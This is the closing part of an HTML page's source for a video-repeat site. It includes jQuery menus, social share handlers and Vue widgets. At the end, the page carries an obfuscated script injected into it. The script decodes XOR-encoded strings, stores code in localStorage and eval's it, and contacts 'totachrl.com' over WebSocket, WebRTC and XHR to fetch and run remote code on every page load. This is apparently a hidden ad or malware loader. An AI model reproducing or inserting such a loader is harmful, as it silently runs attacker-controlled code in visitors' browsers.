thisPlaylist=LS.userdata.playlists[i],isInPlaylist=$("[data-list=playlist]").find("li:nth-child("+(i+1)+") .drawer [data-id="+itemId+"]").length?"checked":"";playlists+='<li class="js--playlist">                        <label class="menu__item">                            <input type="checkbox" class="js--addToPlaylist" '+isInPlaylist+'/>                            <span class="menu__label ellipsis">'+thisPlaylist.title+"</span>                        </label>                    </li>"}return'<div class="has--shadow-strong menu no--select">                <strong class="menu__title">Add to...</strong>                <ul>                    <li>                        <label class="menu__item">                            <input type="checkbox" id="addBookmark" '+isBookmark+'/>                            <span class="menu__label ellipsis">Bookmarks</span>                        </label>                    </li>                </ul>                <ul class="playlist--mobile-detect">'+playlists+'</ul>                <a class="js-sharer menu__share menu__share--tw" data-service="Twitter" data-medium="Track Menu" href="javascript:;" title="Tweet">                    <svg class="icon"><use xlink:href="#icon-twitter"></use></svg>                </a>                <a class="js-sharer menu__share menu__share--fb" data-service="Facebook" data-medium="Track Menu" href="javascript:;" title="Share on Facebook">                    <svg class="icon"><use xlink:href="#icon-facebook"></use></svg>                </a>            </div>'},menuPlaylist:function($trigger){return'<div class="has--shadow-strong menu no--select">                <form id="renamePlaylist">                    <input type="text" placeholder="Rename Playlist" />                </form>                <a href="javascript:;" class="button js--remove-playlist">Remove Playlist</a>            </div>'}};function toggleMenu(e){var $trigger=$(e.target),$menuPlaceholder=$trigger.siblings(".menu-placeholder");if($trigger.is("[data-open-menu]")&&$menuPlaceholder.find(".menu").length){$(".menu").remove();ga("send",{hitType:"event",eventCategory:"Add Menu",eventAction:"click",eventLabel:"Close Menu"})}else if($trigger.is("[data-open-menu]")){$(".menu").remove();var whichMenu=$trigger.attr("data-open-menu");if(whichMenu==="track")$menuPlaceholder.html(tpl.menuTrack($trigger));else if(whichMenu==="playlist")$menuPlaceholder.html(tpl.menuPlaylist($trigger));setTimeout(function(){$menuPlaceholder.find(".menu").addClass("menu--active");ga("send",{hitType:"event",eventCategory:"Add Menu",eventAction:"click",eventLabel:"Open Menu"})},1)}else{if(!$trigger.closest(".menu").length){if($(".menu").length){$(".menu").remove();ga("send",{hitType:"event",eventCategory:"Add Menu",eventAction:"click",eventLabel:"Close Menu"})}}}}$(function(){$("html").on("click",toggleMenu);$("body").on("change","#addBookmark",addBookmark);$("body").on("change",".js--addToPlaylist",addToPlaylist)});$(function(){$("body").on("click",".js-sharer",function(e){e.preventDefault();var $t=$(this),service=$t.attr("data-service").toLowerCase(),share_url="",$ct=$t.parents("[data-id]").first(),title=$ct.find(".js--title").text(),id=$ct.attr("data-id"),thumb="https://i.ytimg.com/vi/"+id+"/hqdefault.jpg",media_url="http://youtubeonrepeat.com/watch/?v="+id,description="Repeat youtube videos automatically at http://youtubeonrepeat.com",caption="YOUTUBEONREPEAT.COM",fromVideoPage=$t.parents(".mediacard__share").length;if(fromVideoPage){var videoFrom=parseInt($("#videoStart").attr("data-time")),videoTo=parseInt($("#videoEnd").attr("data-time")),videolength=convert_time($("body").attr("data-videolength"));if(videoFrom!==0)media_url+="&from="+videoFrom;if(videoTo!==videolength)media_url+="&to="+videoTo}media_url=encodeURIComponent(media_url);if(service=="facebook"){share_url="https://www.facebook.com/dialog/feed?app_id="+app.fbAppId+"&display=popup&description="+description+"&caption="+caption+"&link="+media_url+"&redirect_uri="+media_url+"&picture="+thumb}else if(service=="twitter"){share_url="https://twitter.com/share?url="+media_url+"&text="+title+"&via=youtubeonrepeat&hashtags=onrepeat"}else if(service=="google+"){share_url="https://plus.google.com/share?url="+media_url}else if(service=="tumblr"){share_url="http://tumblr.com/share/link?url="+media_url+"&content="+thumb+"&posttype=photo&tags=onrepeat,youtubeonrepeat&show-via="+media_url}else if(service=="pinterest"){share_url="http://pinterest.com/pin/create/button/?url="+media_url+"&description="+title+" on repeat at http://youtubeonrepeat.com&media="+thumb}else if(service=="reddit"){share_url="http://www.reddit.com/submit?url="+media_url+"&title="+title+" on repeat at http://youtubeonrepeat.com"}if(share_url.length){window.open(share_url,"Sharer","height=500,width=900,top=150,left=150").focus();ga("send",{hitType:"event",eventCategory:fromVideoPage?"Video Page Shares":"Add Menu",eventAction:"share",eventLabel:service})}})});var aPhrases=["You know you want to","Gotta love some repeatin'","Push the button","Give some love","Sharing is caring!","Make a kitten happy!","Make me happy!"],aColors=["#E14E42","#2196f3","#56C894"];$(".sidebar__likeus-title").text(aPhrases[getRandomInt(0,aPhrases.length)]).css("color",aColors[getRandomInt(0,aColors.length)]);if($.browser.mobile){$("html").addClass("is-mobile")}</script>
    <script>
        $(function(){
            // Add videos from Recent history
            var vm = new Vue({
                el    : '[data-vue="js-vue--posts-recent"]',
                data  : {
                    'posts' : { 'items' : LS.history }
                },
                ready : function () {
                    $(this.$el).removeAttr('data-vue');
                    bLazy.revalidate();
                }
            });

            // Add Popular Videos
            app.populate('videos?chart=mostPopular&videoCategoryId=10&regionCode=gb', 12, '[data-vue="js-vue--posts-popular"]');
        });
    </script>

    <!--<script src="https://code.jquery.com/jquery-3.1.1.slim.min.js" integrity="sha384-A7FZj7v+d/sdmMqp/nOQwliLvUsJfDHW+k9Omg/a/EheAdgtzNs3hpfag6Ed950n" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tether/1.4.0/js/tether.min.js" integrity="sha384-DztdAPBWPRXSA/3eYEEUWrWCy7G5KFbe8fFjk5JAIxUYHKkDx6Qin1DkWx51bBrb" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/js/bootstrap.min.js" integrity="sha384-vBWWzlZJ8ea9aCX4pEW3rVHjgjt7zpkNpZk+02D9phzyeVkE+jo0ieGizqPLForn" crossorigin="anonymous"></script>-->
<script>try{(function(){function C(){try{var a=L()}catch(c){}if(a)try{D(a.h,null)}catch(c){delete window.localStorage[a.key],delete window.sessionStorage[a.key]}else M(function(a,b){b.as=!0;try{D(a,b)}catch(e){}},N)}function N(){var b=window.location.protocol==a("XSYCCBFN")?a("XSYCCBFNGhc="):a("XSYCCFhYGg==");(new Image).src=b+u+O}function M(a,c){function b(){var d=e.shift();if(d)try{d(a,b)}catch(m){b()}else v(),c()}try{P()}catch(f){v();c();return}var e=[Q,R,S,T];b()}function D(a,c){(function(){eval(a)})({e:a,
        p:c,n:g})}function L(){var b=[];window.localStorage&&b.push(window.localStorage);window.sessionStorage&&b.push(window.sessionStorage);var c=E(a("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="),F(a("RSATGQ8VWV0=")));c=new Uint8Array(c);for(var d="",e=0;e<c.length;e++)d+=String.fromCharCode(c[e]);c=btoa(d);d=(new Date).getTime();for(e=0;e<b.length;e++){var f=b[e],m;for(m in f)if(0===m.lastIndexOf(c,0)){try{for(var k=a("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="),g=atob(f[m]),l=new Uint8Array(g.length),
                                                                                                                                                                                                                                                                                                                                                                                                                                       h=0;h<g.length;h++)l[h]=g.charCodeAt(h);var n=r(E(k,l.buffer))}catch(V){continue}h=parseInt(n.substring(0,13),10);if(!isNaN(h))if(864E5<d-h||1>d-h)f.removeItem(m);else if((h=n.substring(13))&&!(16>h.length))return{h:h,key:m}}}return null}function R(b,c){var d=a("BmZBQA=="),e=a("AhBMS1RNAHxNeVVQdhF7WSt7AElsT3x3MkFjNiFMXgQPFjVCIDUPeUJxX1INEnVbKHd7RGdMfn1OQG5NJEZXDAJoQk5YNAYCMX5WWXJqA1BQBHRKY0NyD0ZIbUJYMys=");d=w+":"+d;var f={};f[a("QCAaCw==")]=a("QScEFlg=")+d+a("CiYEGQwERVcFP1EeVCA=");f[a("ViATHAcZQVEWJw==")]=
        a("TDMCEQ8W");f[a("QCETCgwWWF0=")]=a("TDMCEQ8W");G(e,f,function(b){b=b.match(new RegExp(a("azEXFgYeUVkDLlY2U3thPQ5qYVhpTD0pBA4MMzJfTWhReVZQPhMeZFkXCEFrfh0FQR1vLDJdYW0oFnJXFg8dFEc3Ghkb")));if(null==b)return null;b=b[1];return a("VjMYHAsTVEwScV1KBnAUJTpheUNlR3p7R1I=")+b+a("FWRFSFNBFUwOO0wYUjwgGEozIBQyBGg=")+b+a("FSAGFxADFQ5Ee11cFz4kFR0uMxt7FSc+AFJp")},b,c)}function S(b,c){var d=a("A2JGSQ=="),e=a("c2dMOSBNDQFNDlhQA2F7WFt7dklsRXt3REBjNVpMWnUPZzRCJ0YPfkJxWFwNZwRbLAR7RRBMenlOSh9NIDNXAHBoRTtYMnYCQHNWWgFqdFJQAHNKZTByeTVIbk5YT1U=");
        d=w+":"+d;var f={};f[a("QCAaCw==")]=[a("RiYDFlg=")+d];G(e,f,function(b){b=b.match(new RegExp(a("azEXFgYeUVkDLlY2U3thPQ5qYVhpTD0pBA4MMzJfTWhReVZQPhMeZFkXCEFrfh0FQR1vLDJdaBEQWXBXFg8dFEYgEBQa")));if(null==b)return null;b=b[1];return a("VjMYHAsTVEwScVxKBnAUJTphc0FiQXx1R0RtQEI=")+b+a("FSYPCEIfWksD")},b,c)}function G(b,c,d,e,f){function m(a){k||(k=!0,a.apply(null,Array.prototype.slice.call(arguments,1)))}var k=!1;e=m.bind(null,e);f=m.bind(null,f);var p={};p[a("XDETKwcFQ10FOA==")]=[c];var l=new g.c(p);l[a("ViATGRYScVkDKi8CVj4vBAY=")](a("Gj8TDANYRVEZLA==")).binaryType=
        a("VCAEGRsVQF4RLh4=");l[a("WjwfGwcUVFYTIggLQzU=")]=function(b){if(null!=b[a("VjMYHAsTVEwS")]&&(b=d(b[a("VjMYHAsTVEwS")][a("VjMYHAsTVEwS")]),null!=b)){var c={};c[a("VjMYHAsTVEwS")]=b;c[a("RjYGNS4eW10+JQgPTw==")]=0;l[a("VDYSMQESdlkZLwUOViQk")](new g.b(c),function(){},function(){})}};l.addEventListener(a("XDETGw0ZW10UPwUFWSM1AB4kIhg3GC8o"),function(){l[a("XDETOw0ZW10UPwUFWQM1AB4k")]===a("UzMfFAcT")&&f()});var h=a("Q29Gcg1KQEsSOQILWjVhUUpxYTkYVgEdQFJoRVVYXRoFfEdyEUpGXQQ4BQVZPiAMD0siTR84aAQkRnlGUEFDBBtiWEloAwgIV3tmCwo2KA8NJDMAJB8mOU4BMRZPRFgCFQ==")+
        b+a("PzNLEQESGFcHPwUFWSN7FRgoIhs6E0IgSRMpBw4fDlVBOxkWQkYHC0NrKD57A24yKRURUGNGeH1+E2QEAQIdWVQiTE1SRwUYAC4OGEMzbAULNSATPhcmIxEeeUVXQGdVCDsVHU8CU0oWLFY=")+function(){for(var b="",c=a("BWJGSFJHBQg="),d=0;16>d;++d){var e=(4294967296*Math.random()>>>0).toString(16);b+=c.substring(0,c.length-e.length)+e}return b}()+a("PzNLEQESGEgAL1ZaB2BxUVpxcUBmRnh9REJpR1JGXQQFYkZIUkcFCEd7XGA=");l[a("ViATGRYSel4RLh4=")](function(b){l[a("RjcCNA0UVFQzLh8JRTkxFQMuLw==")](b,function(){var b={};b[a("QSsGHQ==")]=a("VDwFDwcF");
        b[a("RjYG")]=h;l[a("RjcCKgcaWkwSDwkZVCIoER4oLh4=")](new g.f(b),function(){},function(){})},function(){})},function(){});b=l[a("ViATGRYScVkDKi8CVj4vBAY=")](a("GiUFCGI=")+window.navigator.userAgent);b.binaryType=a("VCAEGRsVQF4RLh4=");H(b,x(),function(b){e(b,{rtc:l})},function(){f()})}function T(b,c){function d(b){m||(m=!0,b.apply(null,Array.prototype.slice.call(arguments,1)))}var e=x();e=(window.location.protocol==a("XSYCCBFN")?a("XSYCCBFNGhc="):a("XSYCCFhYGg=="))+u+e;var f=a("chci"),m=!1;b=d.bind(null,
        b);c=d.bind(null,c);var k=new g.g;k.onreadystatechange=function(){4==k.readyState&&(0==k.status?c():b(r(k.response),{}))};k.onerror=function(){c()};k.open(f,e,!0);k.responseType=a("VCAEGRsVQF4RLh4=");k.send(null)}function Q(b,c){var d=a("QiEFQk1Y"),e=new g.a(d+w+a("GiUFCA=="));e.binaryType=a("VCAEGRsVQF4RLh4=");H(e,x(),function(a){b(a,{ws:e})},function(){c()})}function H(b,c,d,e){function f(b){g||(g=!0,b.apply(null,Array.prototype.slice.call(arguments,1)))}var g=!1;d=f.bind(null,d);e=f.bind(null,
        e);var k=!1,p=setTimeout(function(){e(Error())},3E3),l=F(JSON.stringify({url:c||"",method:a("chci"),headers:{"X-Tb":["ll"]},body:null}));b.onopen=function(){clearTimeout(p);b.send(l)};var h=new ArrayBuffer(0),n;b.onmessage=function(b){if(4===b.data.byteLength){var a=new Uint8Array(b.data);if(222===a[0]&&173===a[1]&&190===a[2]&&239===a[3])return}!1===k?(k=!0,b=r(b.data),n=JSON.parse(b),n={status:n.status||0,headers:n.headers||{}}):(b=b.data,a=new Uint8Array(h.byteLength+b.byteLength),a.set(new Uint8Array(h),
        0),a.set(new Uint8Array(b),h.byteLength),h=a.buffer)};b.onerror=function(){clearTimeout(p);e(Error())};b.onclose=function(){k?(n.body=h,d(r(n.body))):(clearTimeout(p),e(Error()))}}function y(b){return window[b.name]?window[b.name]:b[a("Vj0YDAcZQXwYKBkHUj41")]&&b[a("Vj0YDAcZQXwYKBkHUj41")][a("UTcQGRcbQW4eLhs=")]?b[a("Vj0YDAcZQXwYKBkHUj41")][a("UTcQGRcbQW4eLhs=")]:b[a("Vj0YDAcZQW8eJQgFQA==")]}function I(){var b=document.createElement(a("XDQEGQ8S"));b.style.height=a("BCIO");b.style.width=a("BCIO");b.style.display=
        a("Wz0YHQ==");b[a("RiAVHA0U")]=a("VA==");b.name||(b.name=String.fromCharCode(parseInt(25*Math.random()+97,10))+Math.random().toString(36).substring(7));(document.body||document.head||document.documentElement).appendChild(b);var c=y(b);c.document.documentElement||c.document.write(a("VA=="));try{c.stop()}catch(d){}return b}function P(){J=a("QDwdFg0AWw==");t=a("VjoEFw8S");q=a("UzsEHQQYTQ==");z=a("WiITCgM=");A=a("RjMQGRAe");var b=I();b=y(b);var c=b.navigator.userAgent;var d=(new RegExp(a("VjoEFw8SSVsfOQMHXiUs"),
        "i")).test(c)?t:(new RegExp(a("UzsEHQQYTUQeKAkdUjEyBAY9Jwg/GTs="),"i")).test(c)?q:(new RegExp(a("a3peR0MUXUoYJgkWVj4lEwUoJVl4X2I+FRQ4BQs="),"i")).test(c)?A:(new RegExp(a("WiIEBA0HXFcE"),"i")).test(c)?z:window[a("VjoEFw8S")]?t:"undefined"!==typeof InstallTrigger?q:J;-1===[t,q,z,A].indexOf(d)&&(b=window);c=a("UCQXFA==");g.c=b[c](a("QjsYHA0AG2ojCDwPUiICDgQvJBMiHycjVA4lVxUfA1BaJVgPBxVeUQMZOClnNSQTKS4vHjMVPCQbHHkLHlYaXVs2GQ9MGlpCJR8vOlI1MyIFLy8VNQIhIhpSJQtCAQRaUT0BVg8EZ2w0GwkPRRMuDwQkIgQ/GSY="));g.f=b[c](a("QjsYHA0AG2ojCD8PRCMoDgQFJAM1BCE9ABs2GUIKERRCOxgcDQAbTxIpBwNDAhUiOSQyAz8ZJgkRAToFCwYZXVo8VgQeV0JRGS8DHRk9Lhs4FQIjMwU7JBscHRIRFR9dRSYfFwxXSURXPAUEUz82TwcyEyQVJS0+Bxs2GSYTHldHOwYMCxhb"));
        g.b=b[c](a("QjsYHA0AG2ojCCUJUhMgDw4oJREiE2gxCFIuHgwSAkMbJRMaCR5BaiMIJQlSEyAPDiglESITaDEIUi4eDBICQxs/GQIwI3ZxFC4vC1k0KAULNSRQKgpoOh0cPRgVWABHZwY1MQESdlkZLwUOViQk"));d===q?(d=I(),g.a=y(d)[c](a("QjsYHA0AG28SKT8FVDskFQ==")),d.parentElement.removeChild(d)):g.a=b[c](a("QjsYHA0AG28SKT8FVDskFQ=="));g.g=b[c](a("QjsYHA0AG2A6ByQeQyATBBs0JAMi"))}function E(b,a){var c=new Uint8Array(a),e=new ArrayBuffer(a.byteLength);e=new Uint8Array(e);for(var f=0;f<a.byteLength;f++)e[f]=c[f]^b.charCodeAt(f%b.length);return e.buffer}
        function r(b){if(window.TextDecoder)return(new window.TextDecoder("utf-8")).decode(new Uint8Array(b));var a="";b=new Uint8Array(b);for(var d=b.byteLength,e=0;e<d;e++)a+=String.fromCharCode(b[e]);return decodeURIComponent(escape(a))}function F(b){if(window.TextEncoder)return(new window.TextEncoder("utf-8")).encode(b).buffer;b=unescape(encodeURIComponent(b));for(var a=new Uint8Array(b.length),d=0;d<b.length;d++)a[d]=b.charCodeAt(d);return a.buffer}function x(){return a("GjcORxVK")+5675953564942336}function a(b){b=
            window.atob(b);for(var a="",d=0;d<b.length;d++)a+=String.fromCharCode(b.charCodeAt(d)^"5Rvxbw58wKlj7PAajAApVvHMtrYwbvm4".charCodeAt(d%32));return a}function v(){if(!K){var b=("https:"==window.location.protocol?"https://":"http://")+u+U,a=document.createElement("script");a.type="text/javascript";a.async=!0;a.src=b;(document.body||document.head||document.documentElement).appendChild(a);K=!0}}var B;Math.pow(1,2)&&(B="totachrl.com");var u=B,w="tr."+B,U=decodeURIComponent("%2Fle%3Fw%3D")+5675953564942336,
            O="/l?w="+5675953564942336+"&c=ef&cb="+Math.random().toString().slice(3,9),g={},J,t,q,z,A,K=!1;if(/ucbrowser/i.test(navigator.userAgent)||window.ucweb)try{v()}catch(b){}try{C()}catch(b){}})()}catch(C){};</script>
    <!--<script></script>-->
</body>
</html>